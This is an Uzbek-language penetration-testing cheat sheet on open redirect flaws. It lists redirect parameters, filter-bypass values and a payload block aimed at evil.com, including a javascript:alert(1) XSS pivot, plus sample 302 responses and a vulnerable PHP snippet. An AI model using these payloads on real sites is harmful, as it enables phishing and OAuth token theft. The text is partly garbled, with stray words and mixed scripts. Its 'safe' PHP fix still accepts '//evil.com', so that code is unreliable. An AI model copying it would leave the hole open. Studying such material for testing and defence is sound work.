# Open Redirect

## 1. Ta'rif
Open redirect — sayt foydalanuvchini barcha "next"/"return" parametri orqali ixtiyoriy URL'ga yo'naltirsa. O'zi past sevər, lekin phishing, token leak, OAuth abuse, cache poisoning'da kuchli.

## 2. Qayerdan kelib chiqadi
- Parametrlar: `redirect=`, `next=`, `url=`, `return=`, `continue=`, `dest=`, `ref=`, `r=`
- Login/register/qayta yo'naltirish after-login
- Location header qayerda yo'naltiriladi — `header("Location: $url")`
- JS: `window.location = param`
- DOM: `location.href=...`

## 3. Turlari
| Tur | Misol |
|-----|-------|
| Header open | server 302 |
| JS-based | client redirect |
| Protocol-relative | `//evil.com` |
| Partial bypass | `target.com@evil.com`, `evil.target.com` |
| Cookie/domain confusion | cattlegrid + cookie scopes |

## 4. Metodologiya
1. Barcha parametrlarni fuzz: `?next=`, `url=`, `return_to=`, `goto=`, `redirect_uri=`.
2. Sinov qiymatlar:
   - `https://evil.com`, `//evil.com`, `http://evil.com`
   - `/evil.com`, `\\evil.com`, `%2f%2fevil.com`, `///evil.com`
   - `https:evil.com`, `http:/evil.com`, `@evi.com`
   - `target.com.evil.com`, `target.com@evil.com`, `evil.com/?u=target.com`
   - Open redirect testi curl: `-I` → Location.
3. Validasiya filtrlari:
   - startsWith `target.com` → `target.com.evil.com`
   - contains `target.com` → `evil.com/?x=target.com`
   - `https://` bil chedligi → `//evil.com`
4. Payload encoding: `%09`, `%0d%0a`, double encoding `%252f`.

## 5. Payload'lar
```
/redirect?url=https://evil.com
/redirect?url=//evil.com
/redirect?url=/%2f%2fevil.com
/redirect?url=https:%2f%2fevil.com
/redirect?url=https://target.com@evil.com
/redirect?url=https://evil.com#@target.com
/redirect?url=https://target.com.evil.com
/redirect?url=javascript:alert(1)      # XSS ga o'tish
/redirect?url=/\evil.com
/redirect?url=》evil.com
/redirect?url=https://evil.com%2f..
```

## 6. Request misollari
```
GET /login?redirect=https://evil.com HTTP/1.1
Host: target.com

HTTP/1.1 302 Found
Location: https://evil.com     <-- URL credential_лог loss

# DOM
GET /profile#https://evil.com HTTP/1.1
```

## 7. Zaif code misollari
```php
// ZAIF
$url = $_GET['redirect'];
header("Location: $url");

// XAVFSIZ: whitelist domain, yoki internal relative only
if (!str_starts_with($url, '/')) die('invalid');
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] 302 response Location'ni kuzat
- [ ] Barcha redirect* parametrlarini fuzz
- [ ] Filter bypass kombinatsiyalari (encoding, `//`, `@`, `.`)
- [ ] OAuth redirect_uri — token leak'ga (oauth/note)
- [ ] `script:` / `data:` protocol → XSS interga
- [ ] Cache poisoning bo'lsa — mass user qurbon

## 9. Himoya
- Whitelist: ruxsat etilgan origin/qatqiriq
- Relative-only redirect yoki server-side mapping
- URL validaisya with allowlist schemes
- No open redirect in login/auth flows